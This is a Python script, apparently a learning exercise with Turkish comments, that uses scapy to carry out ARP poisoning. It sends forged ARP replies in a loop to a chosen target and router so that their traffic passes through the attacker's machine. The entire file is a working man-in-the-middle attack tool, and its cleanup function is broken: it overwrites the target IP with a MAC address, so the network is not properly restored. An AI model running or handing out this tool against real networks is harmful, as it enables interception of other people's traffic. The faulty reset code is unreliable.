import scapy.all as scapy
import time
import optparse

def getMAC(ip):

    arpRequest = scapy.ARP(pdst = ip)  # Belirttiğimiz IP adresi için bir ARP paketi oluşturduk.
    # print(scapy.ls(scapy.ARP())) scapy metodlarının nasıl kullanılacağının rehberini alabiliriz.

    broadcastPacket = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") # bu gösterimle genel bir yayın yaptık.
    combinedPacket = broadcastPacket / arpRequest # iki paketi birleştirdik ve kullanımını böyle yapacağız.

    answered_list = scapy.srp(combinedPacket,timeout = 1, verbose = False)[0] # göndermek istediğimiz paketi ve timeout verdik. İlk eleman cevap alabildiğimiz ipleri dönderiyor. Timeout ile cevap verilmeyen request için bekleme yapmayız.
    return answered_list[0][1].hwsrc

def arpPoisoning(targetIP, routerIP):

    targetMAC = getMAC(targetIP)
    # op'nin default değeri 1'dir ve ARP Requesti oluştur anlamına gelir. 2 yaptığımızda ARP Response oluştur diyoruz.
    arpResponse = scapy.ARP(op = 2, pdst = targetIP,hwdst = targetMAC,psrc = routerIP)
    scapy.send(arpResponse,verbose = False)

def arpReset(targetIP, routerIP):

    targetMAC = getMAC(targetIP)
    routerMAC = getMAC(routerIP)

    targetIP = getMAC(targetIP)
    # op'nin default değeri 1'dir ve ARP Requesti oluştur anlamına gelir. 2 yaptığımızda ARP Response oluştur diyoruz.
    arpResponse = scapy.ARP(op = 2, pdst = targetIP,hwdst = targetMAC,psrc = routerIP,hwsrc=routerMAC) # saldırı öncesi var olan değerleri veriyoruz.
    scapy.send(arpResponse,verbose = False,count=6) # Birkaç paket göndererek saldırının resetlendiğinin garanti olması için count ile paket sayısını gönderdik.

def getIPs():
    parseObj = optparse.OptionParser()
    parseObj.add_option("-t","--target",dest = "target_IP",help = "Enter target IP")
    parseObj.add_option("-r", "--router", dest="router_IP", help="Enter router IP")

    options = parseObj.parse_args()[0]

    return options

number = 0

userIPs = getIPs()
userTargetIP = userIPs.target_IP
userRouterIP = userIPs.router_IP

try:
    while True:
        arpPoisoning(userTargetIP, userRouterIP)
        arpPoisoning(userRouterIP,userTargetIP)

        number += 2
        print("\rSending packets..." + str(number))
        time.sleep(2)
except KeyboardInterrupt:
    print("\nQuit and Reset...")
    arpReset(userTargetIP, userRouterIP)
    arpReset(userRouterIP, userTargetIP)